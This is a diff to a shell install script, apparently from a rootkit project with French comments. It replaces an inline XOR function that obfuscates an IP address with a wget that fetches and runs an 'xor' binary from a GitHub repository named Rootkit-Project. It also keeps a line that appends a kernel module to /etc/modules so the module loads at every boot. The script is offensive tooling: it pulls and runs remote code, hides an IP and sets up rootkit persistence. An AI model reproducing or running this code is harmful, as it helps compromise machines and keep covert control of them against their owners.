@@ -13,25 +13,10 @@ fi
 
 key=126
 
-# XOR chaque caractère de l'ip
-xor_encrypt() {
-    input="$1"
-    key="$2"
-    result=""
-    i=0
-    input_len=${#input}
-    while [ "$i" -lt "$input_len" ]; do
-        char=$(printf '%d' "'${input:$i:1}")
-        xor_char=$(( char ^ key ))
-        result="$result$(printf '\\%03o' "$xor_char")"
-        i=$(( i + 1 ))
-    done
-    # Interpréter les séquences octales et produire les caractères
-    printf "%b" "$result"
-}
+wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/insert/xor
+chmod +x xor
+encrypted=$(echo $IP_ADDR | ./xor $key)
 
-# Appliquer le XOR et afficher les résultats
-encrypted=$(xor_encrypt "$IP_ADDR" "$key")
 
 # persistence (load le module au demarage)
 echo "ipv4" >> /etc/modules
